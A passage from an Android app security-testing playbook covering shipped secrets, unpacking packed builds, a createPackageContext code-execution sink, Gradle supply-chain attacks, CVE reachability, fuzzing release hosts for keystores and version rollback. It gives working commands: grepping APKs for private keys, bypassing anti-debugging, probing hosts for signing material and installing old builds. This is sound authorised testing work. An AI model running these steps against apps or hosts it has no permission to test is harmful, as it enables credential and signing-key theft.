- **Ruled out when:** Every candidate string is provably a public-by-design value (a Firebase web API key, a Maps key with correct package+SHA-1 restrictions — verify the restriction, do not assume it), **or** authentication with it fails from a clean host. Two routing traps: a Firebase/Maps key is `intentionally_public_sample_or_invalid` (P5) or `pay_per_use_abuse` (P4), not P1; and an **OAuth `client_secret` found in a mobile app is `sensitive_data_exposure.sensitive_data_hardcoded.oauth_secret` (P5) and sits on the never-submit list** — a public client is not supposed to hold a confidential secret, so the reportable finding is **PKCE non-enforcement** on the authorisation server (-> D13), not the secret's presence.

### D02-048 · Non-release artefacts shipped in the package

| | |
|---|---|
| **Severity ceiling** | Critical (a service-account JSON or private key) down to Low (a stale staging URL) |
| **VRT** | Per the artefact: `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1), `...for_internal_asset` (P3), `sensitive_data_exposure.sensitive_data_hardcoded.file_paths` (P5) |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Maps to** | sec-88 "APK structure"; sec-88 checklist §5 (development files, backup files and old files that should not be in a production release) |

- **Test:** Walk the unpacked structure and flag every file that is not part of a release: test fixtures, `.sql` dumps, service-account JSON, staging configs, document templates, a second `google-services.json`, a `.git` directory.
- **How:**
```bash
unzip -l base.apk | grep -vE '\.(png|webp|xml|arsc|dex)$' | sort -k1 -n -r | head -40
find out/assets out/res/raw -type f | xargs file | grep -viE 'image|xml|data'
grep -rl 'BEGIN RSA PRIVATE KEY\|BEGIN PRIVATE KEY\|-----BEGIN CERTIFICATE' out/
find out -name 'google-services.json' -o -name '*.sql' -o -name '.git' -o -name '*.bak' -o -name '*.orig'
python3 -c "import json,sys;d=json.load(open('out/assets/sa.json'));print(d.get('type'),d.get('client_email'))" 2>/dev/null
```
- **Proof:** A shipped `.p12`/`.jks`/`.pem`, a service-account JSON with `"type": "service_account"`, a `.sql` dump, or a staging config in `assets/` — with the credential proven live per D02-047's liveness standard.
- **Escalation:** -> D18 (cloud backend) -> D15 (staging API with weaker auth) -> D11.
- **Ruled out when:** Every non-code file in the archive is accounted for as a shipping resource, and any config file present contains only values that are public by design (verified, not assumed). Size-sorting the archive listing is the cheapest way to find the outlier — a single unexpectedly large `assets/` entry is the usual tell.

### D02-049 · Packed / superpacked builds — recover the DEX that actually runs

| | |
|---|---|
| **Severity ceiling** | Medium (the severity comes from what the hidden code does) |
| **VRT** | `lack_of_binary_hardening.lack_of_obfuscation` (P5) for the packing itself — never file it. The finding is whatever the recovered stage contains. |
| **Attacker** | n/a for the technique |
| **Applies to** | All packed/protected builds (commercial packers, Meta "superpacked" applications) |
| **Maps to** | ATT&CK T1406.002 Software Packing ("adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers"; CherryBlos used the Jiagubao packer), T1406, T1407; HackTricks README.md "Superpacked Applications"; APKiD |

- **Test:** If the APK's code is compressed into a single opaque file or a packer is in use, a static-only report is incomplete. Run the app and collect the decompressed files, or dump DEX from memory. **Packing alone is informational** — escalate only when the unpacked stage does something the store listing and privacy policy do not describe.
- **How:**
```bash
apkid base.apk                       # identify compiler / packer / obfuscator
# entropy sweep for an encrypted blob
for f in $(unzip -Z1 base.apk 'assets/*' 'lib/*' 'res/raw/*'); do
  unzip -p base.apk "$f" | ent 2>/dev/null | awk -v n="$f" '/Entropy/ {print n, $0}'
done
pip install clsdumper
clsdumper com.target.app --spawn
clsdumper com.target.app --strategies fart_dump,oat_extract --extract-classes
```
  `clsdumper` phase 0 also blocks anti-instrumentation: it hooks `sigaction`/`signal` to stop crash and anti-debug handler registration, serves a filtered `/proc/self/maps` via `memfd_create`, and neutralises `pthread_create` watchdogs.
- **Proof:** Dumped DEX files containing classes absent from the static decompile, with `metadata.json` recording which strategy (`art_walk`, `DexFile::OpenCommon` hook, `memory_scan`, `oat_extract`, `fart_dump`, `mCookie`, `InMemoryDexClassLoader` hook) recovered each. Then diff the static and runtime class lists and show the recovered classes referencing a host or permission absent from static analysis.
- **Escalation:** The recovered DEX usually contains the D17 dynamic-loading logic and the D12 hardcoded keys. Re-run D11/D14/D20 against the recovered stage.
- **Ruled out when:** `apkid` reports no packer, `classes*.dex` decompiles cleanly in jadx, and the runtime class list matches the static one. **Never report "the app is packed" or "the app is not obfuscated"** — `lack_of_binary_hardening.lack_of_obfuscation` is P5 and Grab, Spotify, Starbucks and Xiaomi all list it out of scope verbatim.

### D02-050 · `android:appComponentFactory` plus `createPackageContext` as a code-execution sink

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (varies) — arbitrary code execution in the victim app's process and UID |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | All |
| **Maps to** | developer.android.com risk article `create-package-context` (MASVS-CODE: Code Quality) |

- **Test:** A malicious app that claims a package name a victim passes to `createPackageContext()` and exports `android:appComponentFactory` achieves arbitrary code execution inside the victim. Audit **both** sides: does the target declare an `appComponentFactory`, and does it ever call `createPackageContext`?
- **How:**
```bash
grep -n 'appComponentFactory' out/AndroidManifest.xml
grep -rn 'createPackageContext' out/sources/
grep -rn 'CONTEXT_INCLUDE_CODE\|CONTEXT_IGNORE_SECURITY' out/sources/
```
- **Proof:** A call site matching `createPackageContext(pkg, Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE)` followed by `getClassLoader()`, where `pkg` is a package not present on a clean device. Install a stub with that package name and an exported `appComponentFactory`, then prove execution with a file write from inside the victim's UID — a marker file under the victim's `files/`, visible via `run-as`, named with an 8+ character random string you confirmed is absent from the baseline app.
- **Escalation:** From inside the victim's UID everything in D11/D12/D13 is readable. Note that this mitigation depends on a correct signer check (D02-019) — a `signatures[0]` comparison does not save it.
- **Ruled out when:** No `createPackageContext` call site exists, **or** every call site passes a package name that is a compile-time constant *and* is signature-verified with `hasSigningCertificate(..., CERT_INPUT_SHA256)` before the context is created, **or** the flags omit `CONTEXT_INCLUDE_CODE` (resources-only contexts do not load code).

### D02-051 · Recover `base.odex` when DEX decompilation is fighting you

| | |
|---|---|
| **Severity ceiling** | Support (technique) |
| **VRT** | — |
| **Attacker** | AM-12 (your own rooted device) |
| **Applies to** | Rooted device required; the `oat/<abi>/` path varies by Android version |
| **Maps to** | MASTG-TECH-0007 (Exploring the App Package), MASTG-TOOL-0004 |

- **Test:** When jadx chokes on obfuscated or packed DEX, the AOT-compiled `base.odex` on device can carry resolved symbols and inlined constants the DEX does not.
- **How:**
```bash
adb shell pm path com.example.myapplication
# package:/data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/base.apk
adb root
adb pull /data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/oat/arm64/base.odex
```
- **Proof:** A pulled `base.odex` that disassembles with symbols where `classes.dex` decompiled to garbage.
- **Escalation:** Feeds D16 and D21 reverse engineering; complements D02-049 when the packer defeats static tooling but not AOT compilation.
- **Ruled out when:** jadx produces readable output from `classes*.dex` directly. If `oat/arm64/base.odex` is absent, search under the `pm path` directory before concluding it does not exist — the path moved across Android versions.

### D02-052 · Gradle dependency verification absent or neutered

| | |
|---|---|
| **Severity ceiling** | Medium (argue impact through D02-055/D02-056, never in the abstract) |
| **VRT** | `using_components_with_known_vulnerabilities` (varies) — realistically this is the *missing control* that makes MavenGate and dependency confusion exploitable, not a finding in itself |
| **Attacker** | AM-08 malicious third-party SDK |
| **Applies to** | Gradle builds; source access required; all API levels (build-time control) |
| **Maps to** | Gradle dependency-verification userguide (`--write-verification-metadata sha256\|pgp`, modes `strict`/`lenient`/`off`, `<trusted-key>`, `<trusted-artifacts>`, SNAPSHOTs not verified); Oversecured MavenGate ("Most applications do not check the digital signature of dependencies, and many libraries do not even publish it") |

- **Test:** Absence of `gradle/verification-metadata.xml` means every dependency and every plugin is accepted on trust from whichever repository answered first.
- **How:**
```bash
ls -l gradle/verification-metadata.xml gradle/verification-keyring.keys 2>/dev/null || echo "NO VERIFICATION"
./gradlew --write-verification-metadata pgp,sha256 --export-keys help
grep -c '<ignored-key' gradle/verification-metadata.xml     # keys not found on keyservers
grep -n '<trust ' gradle/verification-metadata.xml          # blanket trust entries
grep -c '<pgp ' gradle/verification-metadata.xml            # how much is actually signed
```
- **Proof:** Either the file is absent, or it contains blanket `<trust group="..."/>` entries or a large `<ignored-key>` count — quote the exact lines. A broad `<trust group="com.mycompany"/>` "automatically trusts all artifacts in that group without validation — disabling verification entirely for matched components."
- **Escalation:** -> D02-055 (MavenGate) and -> D17 (dependency confusion) for the code-execution story. Build-time RCE -> signing-key access on CI -> a malicious release signed with the client's real key.
- **Ruled out when:** `verification-metadata.xml` exists in `strict` mode, contains PGP or SHA-256 entries for every resolved component, has no blanket `<trust group>` entries, and no `<ignored-key>`. Note that SNAPSHOT dependencies are **never** verified by Gradle — their presence is a gap regardless of the file.

### D02-053 · Verification enabled but bypassed: the gpg-without-checksum hole

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) — a security control that reports success while performing no check |
| **Attacker** | AM-08 / AM-06 (MitM on the build host's network) |
| **Applies to** | **LEGACY** — Gradle 6.2 through 7.4.2 only; patched in 7.5 |
| **Maps to** | GHSA-j6wc-xfg8-jx2j (affected 6.2–7.4.2, fixed 7.5: "making sure to run checksum verification if signature verification cannot be completed, whatever the reason"); risks listed as dependency poisoning/confusion and MitM on HTTP downloads |

- **Test:** On the affected Gradle range, an entry with a `gpg` element but no `checksum` element is accepted without validation whenever signature verification cannot be completed (signatures disabled, or no `.asc` on the remote).
- **How:**
```bash
./gradlew --version | grep -i '^Gradle'
grep -n '<pgp\|<gpg' gradle/verification-metadata.xml | head
python3 - <<'PY'
import re
x = open('gradle/verification-metadata.xml').read()
for m in re.finditer(r'<artifact name="([^"]+)">(.*?)</artifact>', x, re.S):
    body = m.group(2)
    if ('pgp' in body or 'gpg' in body) and 'sha' not in body:
        print("UNVERIFIED-ON-FALLBACK:", m.group(1))
PY
```
- **Proof:** A Gradle version in `6.2–7.4.2` **and** at least one `UNVERIFIED-ON-FALLBACK` artefact printed.
- **Escalation:** Removes the only defence against D02-055.
- **Ruled out when:** `./gradlew --version` reports 7.5 or later, **or** every `pgp`/`gpg` entry has a sibling `sha256`/`sha512` checksum. Note the Python here rather than a shell loop — a `for` over an XML file in shell silently produces nothing when the parse fails (D02-069).

### D02-054 · `pluginManagement` repository content filters are ignored

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `using_components_with_known_vulnerabilities` (varies) — a live dependency-confusion path into the build that signs the production APK |
| **Attacker** | AM-08 (publishes a squatted public plugin) |
| **Applies to** | **LEGACY** — Gradle 5.1 through 6.8.3 only, fixed in 7.0. Still routinely present in long-lived enterprise Android repos. |
| **Maps to** | GHSA-jvmj-rh6q-x395 / CVE-2021-29427 — CVSS 8.0, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere); impacts: information disclosure of internal package identifiers, and dependency confusion via name squatting |

- **Test:** On the affected range, `content { includeGroup ... }` and `exclusiveContent` filters inside a `settings.gradle` `pluginManagement {}` block are ignored, so internal plugin coordinates leak to public repositories and a squatted public plugin can be resolved instead of the internal one.
- **How:**
```bash
./gradlew --version
grep -n -A15 'pluginManagement' settings.gradle settings.gradle.kts 2>/dev/null | grep -nE 'content|includeGroup|exclusiveContent'
./gradlew --refresh-dependencies help -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080
```
- **Proof:** A proxy log showing a request for an internal plugin coordinate (`com.client.internal.*`) hitting `plugins.gradle.org` or `repo.maven.apache.org` despite an `includeGroup` filter meant to confine it.
- **Escalation:** An attacker-controlled Gradle plugin is arbitrary code in CI, with the upload key and the Play API token in reach.
- **Ruled out when:** Gradle is 7.0 or later, **or** no `pluginManagement` block declares content filters (there is then nothing to bypass — but check whether internal plugins are resolved from a public repository at all, which is the underlying exposure).

### D02-055 · MavenGate: hijackable `groupId` domains in the dependency tree

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `using_components_with_known_vulnerabilities` (varies) — realistically supply-chain code execution with the app's full UID; route the consequence through `server_side_injection.remote_code_execution_rce` (P1) framing only if you demonstrate it |
| **Attacker** | AM-08 malicious third-party SDK |
| **Applies to** | All Gradle/Maven Android builds; worse when `mavenCentral()`, `jitpack.io` and a private repo are all declared, because repository ordering decides resolution |
| **Maps to** | Oversecured "Introducing MavenGate" (the `groupId` -> reverse-DNS ownership model); MASWE-0044, MASWE-0048 |

- **Test:** Maven `groupId` ownership is proved by DNS control of the reversed domain. If that domain has lapsed, an attacker registers it, claims the `groupId`, and publishes a new higher version of the library. Oversecured measured **3,710 of 26,163** mavenCentral domains (14.18%) as vulnerable and **18.18%** of dependencies interceptable across repositories.
- **How:**
```bash
./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
```
```python
# reverse each groupId into a domain and check registrability — Python, not a shell loop
import re, subprocess, sys
groups = set()
for line in open('deps.txt'):
    m = re.search(r'([a-z0-9][a-z0-9.]+):([A-Za-z0-9._-]+):', line)
    if m: groups.add(m.group(1))
print(f"groupIds: {len(groups)}", file=sys.stderr)
checked = 0
for g in sorted(groups):
    dom = '.'.join(reversed(g.split('.')[:2])) if g.count('.') >= 1 else g
    try:
        out = subprocess.run(['whois', dom], capture_output=True, text=True, timeout=20).stdout
        if re.search(r'No match|NOT FOUND|Status:\s*free|No Data Found', out, re.I):
            print("UNREGISTERED:", dom, "<-", g)
    except Exception as e:
        print("ERROR:", dom, e, file=sys.stderr)
    checked += 1
print(f"checked {checked}/{len(groups)}", file=sys.stderr)   # counts must match
```
```bash
ls gradle/verification-metadata.xml 2>/dev/null || echo "NO dependency verification configured"
gpg --keyserver keyserver.ubuntu.com --recv-keys <KEYID> && gpg --verify artifact.jar.asc
```
- **Proof:** A `groupId` in the **release runtime classpath** whose reversed domain is unregistered, expired or for sale, combined with the absence of `gradle/verification-metadata.xml` or with that artefact carrying no PGP signature. Oversecured's own finding that the default configuration does not validate dependencies in any way — and that even Google's artifacts are unsigned — is what makes this exploitable rather than theoretical.
- **Escalation:** -> D17 (arbitrary code in-process) and from there everything the app can do; build-time RCE -> CI signing-key access -> a malicious release signed with the client's real key.
- **Ruled out when:** Every `groupId` in the release runtime classpath maps to a domain the maintainer demonstrably still controls, **and** `verification-metadata.xml` pins a trusted key or checksum for each. Print your counts — an under-counted loop here reads as a clean result (D02-069).

### D02-056 · Duplicate-class shadowing (Maven-Hijack) in the release classpath

| | |
|---|---|
| **Severity ceiling** | High when the shadowed class is security-relevant (a verifier, a signer, a crypto helper) |
| **VRT** | `using_components_with_known_vulnerabilities` (varies); `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) when the shadowed class is a verifier |
| **Attacker** | AM-08 |
| **Applies to** | All Gradle/JVM builds |
| **Maps to** | Gradle blog "Detecting Maven-Hijack-style risks in Gradle builds with the Dependency Analysis Gradle Plugin" — DAGP 3.5.0+, `buildHealth` / `reason` / `fixDependencies`, three risk categories (no duplicates / identical duplicates / incompatible duplicates) |

- **Test:** Two dependencies both provide the same fully-qualified class; the classloader takes the first on the classpath. An attacker who controls an *earlier* dependency shadows a class belonging to a *later*, trusted one without touching app code.
- **How:**
```kotlin
// settings.gradle.kts
plugins { id("com.autonomousapps.build-health") version "3.5.1" }
// root build.gradle.kts
dependencyAnalysis { issues { all { onAny { severity("fail") } } } }
```
```bash
./gradlew buildHealth
./gradlew :app:reason --id :suspect-lib
```
- **Proof:** A `buildHealth` entry flagging **binary-incompatible** duplicate classes, e.g. `Expected METHOD com/example/trusty/TrustyService.greet(Ljava/lang/String;)Ljava/lang/String;, but was com/example/trusty/TrustyService.greet(Ljava/lang/String;)I`. Identical duplicates are merely redundant; **incompatible duplicates are the attack signal**.
- **Escalation:** Combine with D02-055 — hijack the *earlier* `groupId`, ship the shadowing class, done.
- **Ruled out when:** `buildHealth` reports no duplicates, or only identical duplicates, across the release runtime classpath.

### D02-057 · Gradle wrapper jar and distribution URL integrity

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High when the distribution is fetched over HTTP or from a mutable internal mirror |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) |
| **Attacker** | AM-06 (MitM on the build host's network) / AM-08 |
| **Applies to** | All Gradle projects |
| **Maps to** | Gradle "Protecting Project Integrity" (wrapper checksum validation, `distributionSha256Sum` in `gradle-wrapper.properties`, `gradle :wrapper` regeneration from a known-good local distribution); spght.dev (same, plus homoglyph attacks on wrapper scripts) |

- **Test:** `gradle-wrapper.jar` executes on every build with full developer and CI privileges and is committed as a binary blob. A swapped wrapper jar or an unpinned distribution URL is arbitrary code execution in the build.
- **How:**
```bash
shasum -a 256 gradle/wrapper/gradle-wrapper.jar     # compare against Gradle's published checksums
grep -n 'distributionUrl\|distributionSha256Sum' gradle/wrapper/gradle-wrapper.properties
gradle wrapper --gradle-version=8.7 --gradle-distribution-sha256-sum=<published-sha256>
```
- **Proof:** A missing `distributionSha256Sum`, or a `gradle-wrapper.jar` whose SHA-256 matches no published Gradle release checksum. Also flag a `distributionUrl` that is `http://` or points at a non-`services.gradle.org` host.
- **Escalation:** Build-host RCE -> signing-key theft -> a malicious release signed with the client's real key. Same terminal impact as D02-055; file them as one chain with separate primitives (D02-071).
- **Ruled out when:** The wrapper jar hash matches a published Gradle release, `distributionSha256Sum` is present and correct, and `distributionUrl` is an `https://services.gradle.org` URL.

### D02-058 · Dependencies fetched over plaintext HTTP

| | |
|---|---|
| **Severity ceiling** | Medium–High (High when the repository serves build-time-executing artefacts, i.e. plugins) |
| **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) |
| **Attacker** | AM-06 network attacker on the developer's or CI runner's network |
| **Applies to** | All Gradle builds. Gradle 7+ requires `allowInsecureProtocol = true` to permit an `http://` repository — its presence is an explicit decision. |
| **Maps to** | GHSA-j6wc-xfg8-jx2j impact section ("Man-in-the-middle attacks: HTTP-based downloads remain vulnerable to interception and replacement") |

- **Test:** An `http://` Maven repository means every artefact — including ones that execute during the build — is MitM-able.
- **How:**
```bash
grep -rnE "maven[^\n]*\{[^}]*url[^}]*['\"]http://" --include='*.gradle' --include='*.gradle.kts' .
grep -rn "allowInsecureProtocol\|isAllowInsecureProtocol" --include='*.gradle*' .
```
- **Proof:** The literal repository declaration with an `http://` URL, plus — where you can run the build on a network you control — a proxy log showing the `.jar`/`.aar`/`.pom` fetched in cleartext.
- **Escalation:** An intercepted plugin jar is build RCE (-> D02-057); an intercepted AAR is a backdoored shipped app (-> D17).
- **Ruled out when:** Every declared repository uses `https://`, and no `allowInsecureProtocol` appears anywhere in the build scripts including `settings.gradle` and `buildSrc`.

### D02-059 · SBOM of the shipped binary, reconciled against the declared graph

| | |
|---|---|
| **Severity ceiling** | Medium (when the binary contains a component absent from the declared graph) |
| **VRT** | `using_components_with_known_vulnerabilities` (varies) |
| **Attacker** | AM-08 |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0274 (SBOM route), MASTG-TECH-0130, MASTG-TOOL-0134 (cdxgen), MASTG-TOOL-0130 (blint); safeguard.sh mobile SBOM guide; susatest ("The final artifact you ship is a binary, not a lockfile. Monitor the binary.") |

- **Test:** Prove the SBOM describes the artefact that reaches users. Scanning a lockfile proves nothing about a DEX plus ARM64 binary.
- **How:**
```bash
# source-side (authoritative for coordinates)
./gradlew :app:cyclonedxBom
./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
# binary-side (authoritative for what shipped)
syft base.apk -o cyclonedx-json=apk-sbom.json
cdxgen -t android -o apk-sbom.json .
```
  Then reconcile: every coordinate in the source SBOM must have a matching class or `.so` in the APK, and vice versa.
- **Proof:** A reconciliation table with a non-empty "in source SBOM but not in APK" column (dead weight -> lower severity on any CVE there) and a non-empty "in APK but not in source SBOM" column (vendored/shaded code, a jar in `assets/`, a plugin-injected library -> a supply-chain finding in its own right).
- **Escalation:** Feeds D02-060 (osv-scanner) and D02-008 (source-to-artefact correspondence). An undeclared bundled component is a reportable control failure even before any CVE.
- **Ruled out when:** Both columns of the reconciliation are empty. A source-only SBOM never rules this out — the whole point is the binary side.

### D02-060 · osv-scanner over the reconciled list, then the reachability gate

| | |
|---|---|
| **Severity ceiling** | Inherits the CVE's severity **only with reachability**; Low at most without it |
| **VRT** | `using_components_with_known_vulnerabilities.outdated_software_version` (**P5**) for a version string alone — this is the closed-informative trap |
| **Attacker** | Follows the CVE |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0272 (Gradle route), MASTG-TEST-0274, MASTG-TECH-0131, MASTG-TOOL-0131 (dependency-check), MASTG-TOOL-0132 (dependency-track); MASWE-0044 (CWE-1395, CWE-1357), MASVS-CODE-3; CVE-2021-0341, CVE-2020-8913; susatest; Project Zero CVE-2022-2294 RCA ("the bug is only reachable in applications that use SDP munging") |

- **Test:** Map coordinates to advisories with an ecosystem-native database rather than NVD CPE matching, which has poor coverage for mobile Maven artefacts and produces AndroidX/support-library false positives (Dependency-Check 9.0.0 misflagged legacy support-library CVEs against AndroidX). Then prove reachability, or expect "Informative".
- **How:**
```bash
osv-scanner scan -r ./android-project/ --format json --output-file osv.json
osv-scanner scan -L gradle/verification-metadata.xml
osv-scanner --offline-vulnerabilities --download-offline-databases ./android-project/
# (a) did the vulnerable symbol survive R8?
for d in $(unzip -Z1 base.apk 'classes*.dex'); do unzip -p base.apk "$d" > "/tmp/$d"; done
dexdump -d /tmp/classes*.dex | grep -n "Lokhttp3/internal/tls/OkHostnameVerifier;->verify"
jadx -d out base.apk && grep -rn "writeBitmapToUri\|SplitCompat.install\|enableDefaultTyping\|activateDefaultTyping" out/sources/
# (b) walk callers in jadx-gui: right-click the method -> Find Usage (Ctrl+Shift+X), up to
#     onCreate/onNewIntent, onReceive, shouldOverrideUrlLoading/@JavascriptInterface, openFile/query,
#     or a network response parser.
# (c) confirm the frame is actually entered
frida -U -f com.target.app -l reach.js
```
```javascript
// reach.js — prove the vulnerable sink executes, dump the argument and the stack that got there
Java.perform(function () {
  var C = Java.use('com.canhub.cropper.utils.BitmapUtils');   // swap for your sink
  var m = C.writeBitmapToUri;
  m.implementation = function () {
    console.log('[REACHED] args=' + JSON.stringify(Array.prototype.slice.call(arguments).map(String)));
    console.log(Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
    return m.apply(this, arguments);
  };
});
```
- **Proof:** Three artefacts pasted into the report: the `dexdump`/jadx line showing the symbol present after shrinking, the jadx "Find Usage" chain from an exported entry point down to the sink, and the Frida `[REACHED]` log with the attacker-supplied value visible in `args`. Keep the `pkg:maven/...@version` PURL string — triagers accept it as the version assertion.
- **Escalation:** Vulnerable crypto libraries -> D12; vulnerable parsers (XML, image, archive) -> D17; vulnerable HTTP stacks -> D14. A worked calibration from the corpus: okhttp 4.9.0 (CVE-2021-0341) with no pinning and system trust = **Low**.
- **Ruled out when:** The vulnerable class or method is absent from `classes*.dex` after R8/LLVM dead-code elimination, **or** no caller chain reaches it from an attacker-influenced entry point, **or** the Frida hook never fires while you drive every reachable flow. "The scanner found a version" is not a finding and "the scanner found nothing" is not a ruled-out.

### D02-061 · Library version fingerprinting when R8 stripped the version markers

| | |
|---|---|
| **Severity ceiling** | Support (it is the evidence that makes every version-based finding survive triage) |
| **VRT** | — |
| **Attacker** | n/a |
| **Applies to** | All; essential for R8/ProGuard-obfuscated release builds |
| **Maps to** | LibScout README — profile/match commands, obfuscation resilience, `[SECURITY]` / `[SECURITY-FIX]` tags. Its shipped vulnerable set includes OkHttp 2.1–2.7.4 and 3.0.0–3.1.2 (certificate-pinning bypass, fixed 2.7.5 / 3.2.0), Apache Commons Collections 3.2.1 / 4.0 (deserialization, fixed 3.2.2 / 4.1) and Dropbox SDK 1.5.4–1.6.1 (fixed 1.6.2) |

- **Test:** When `META-INF/*.version` and `BuildConfig` are gone you still must produce a version. Use bytecode-structure fingerprinting, not package names, which R8 renames.
- **How:**
```bash
# cheap first pass — version markers that often survive
unzip -l base.apk | grep -Ei 'META-INF/.*\.version|kotlin-tooling-metadata\.json|\.properties$'
unzip -p base.apk assets/some.properties | grep -i version
strings out/lib/*/libavif_android.so | grep -iE 'dav1d|1\.'
# structural fingerprinting
java -jar LibScout.jar -o profile -a android.jar -x lib.xml okhttp-4.9.1.aar
java -jar LibScout.jar -o match -p ./profiles -a android.jar -u -j ./json base.apk
```
  LibScout builds hashtree (Merkle) profiles from original `.jar`/`.aar` SDKs, is resilient to identifier renaming, and narrows to an exact version or 2–3 candidates via similarity scoring.
- **Proof:** LibScout JSON naming the library and a version (or a small candidate set) with its similarity score — the artefact that answers "prove it is actually 4.9.1 and not 4.12.0".
- **Escalation:** A confirmed version unlocks the CVE items in D10/D12/D14/D16/D17 and gives D02-060 a defensible input.
- **Ruled out when:** The APK carries intact `META-INF/*.version` or `BuildConfig` version constants for every security-relevant library, in which case fingerprinting is unnecessary — but record the values, do not skip the inventory.

### D02-062 · Build artefacts left on the API or CDN host

| | |
|---|---|
| **Severity ceiling** | Critical (a leaked keystore is app impersonation) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) for signing material; `server_security_misconfiguration.directory_listing_enabled.sensitive_data_exposure` (varies) for an exposed release directory |
| **Attacker** | AM-01 remote, no interaction |
| **Applies to** | All |
| **Maps to** | Gowthams `approach.md` -> BFAC (Backup File Artifacts Checker); sehno -> Configuration Management |

- **Test:** Run the old/backup/unreferenced-file hunt against the **mobile API and release-distribution hosts** specifically: `.apk`, `.aab`, `mapping.txt`, `.map`, `.bundle`, `.jks`/`.keystore`, source zips left in the release directory.
- **How:**
```bash
bfac --url https://api.example.com/ --level 4
ffuf -u https://releases.example.com/FUZZ -w raft-large-files.txt -mc 200,206 -ac
ffuf -u https://releases.example.com/FUZZ -w <(printf '%s\n' app-release.apk app-release.aab mapping.txt app.map keystore.jks upload.keystore) -mc 200,206
```
- **Proof:** A 200 download of an artefact containing source, signing material, or an unreleased build. For a keystore, `keytool -list -v` enumerating a `PrivateKeyEntry` is the proof; stop there.
- **Escalation:** A leaked keystore is Critical (app impersonation, and it invalidates every signature-based control in this chapter at once). A leaked unreleased build feeds D01 and D02-009. A leaked `mapping.txt` satisfies D02-007.
- **Ruled out when:** Every probe returns 404 or a soft-404 — verify with the control: compare the response body and byte length against a deliberately nonsensical path (`/zzz-nonsense-$RANDOM`). A byte-identical body means a catch-all, not a hit.

### D02-063 · Version rollback: does the backend still serve an older signed build

| | |
|---|---|
| **Severity ceiling** | Medium standalone (missing minimum-client enforcement); **High** when the old build contains an already-patched auth or crypto bug you can re-run against live accounts |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the resurrected bug is an auth bypass; otherwise the severity of whatever the old client re-enables |
| **Attacker** | AM-11 physical unlocked / AM-03 with `REQUEST_INSTALL_PACKAGES`; also a user who sideloads from a mirror |
| **Applies to** | All. Android blocks a *downgrade* over an existing install, so you must uninstall first — state that precondition in the report, because it sets the severity. |
| **Maps to** | Not covered anywhere in the source corpus (verified absence across all 24 research files: `versionCode downgrade` = 0 hits; `rollback protection` = 2 hits, both about verified boot). Reported as a gap, not as a cited identifier. |

- **Test:** An attacker who can uninstall then install plants an **older, legitimately-signed** build whose bug the vendor already fixed. The question is whether the *server* still serves that client.
- **How:**
```bash
apksigner verify --print-certs old.apk     | grep -i sha-256   # MUST match the current cert
apksigner verify --print-certs current.apk | grep -i sha-256
adb uninstall com.target.app && adb install old.apk
adb shell dumpsys package com.target.app | grep -i versionCode
curl -s -H 'X-App-Version: 3.1.0' -H 'User-Agent: <old UA>' "$API/v1/me" -o /tmp/old -w '%{http_code}\n'
grep -rniE 'minSupportedVersion|force.?update|minimum_version|versionCode *<' out/sources/
```
  On Android 14+, an old-target build needs `adb install --bypass-low-target-sdk-block old.apk` (see D02-064).
- **Proof:** The old client authenticating and transacting successfully — HTTP 200 on a call the current client also makes — with no `426`/`403`/force-upgrade screen, paired with the already-fixed bug reproducing under the old build.
- **Escalation:** Resurrects any previously-patched client-side finding — combine with the D08/D10 items the vendor believes are closed. Also the natural pair for the retest workflow: if the old build still authenticates after the fix shipped, the "fix" does not remediate anyone who declines the update, and that is its own finding (-> D27).
- **Ruled out when:** The backend returns a force-upgrade response (a distinct status **and** body) to the old client on an authenticated call, over at least two endpoints, **or** the client-side `minSupportedVersion` gate is server-supplied and enforced server-side rather than merely rendered. A client-side-only force-upgrade screen rules out nothing — patch it out and retest.

### D02-064 · Minimum installable `targetSdkVersion` and the documented bypass

| | |
|---|---|
| **Severity ceiling** | Low standalone (it is a harness fact); report only when the client's own distribution channel ships a sub-minimum-target APK |
| **VRT** | — (harness); the finding, where one exists, routes through the distribution channel it affects |
| **Attacker** | AM-03 (an attacker distributing a malicious companion app on a device with developer options) |
| **Applies to** | Installing on Android 14+ (min target 23) and Android 15+ (min target 24) |
| **Maps to** | developer.android.com/about/versions/14/behavior-changes-all (min target 23, `--bypass-low-target-sdk-block`); developer.android.com/about/versions/15/behavior-changes-all (min target raised to 24) |

- **Test:** Confirm whether the app under test can even be installed on the target OS — and note that testers can bypass the block, which means an attacker distributing a malicious *companion* app can too.
- **How:**
```bash
adb install old.apk
# INSTALL_FAILED_DEPRECATED_SDK_VERSION: App package must target at least SDK version 23, but found N
adb install --bypass-low-target-sdk-block old.apk
adb install -r -d old-release.apk || (adb uninstall com.target.app && adb install old-release.apk)
```
- **Proof:** The exact `INSTALL_FAILED_DEPRECATED_SDK_VERSION` string followed by a successful install with the bypass flag, and the old `versionCode` visible in `dumpsys package`.
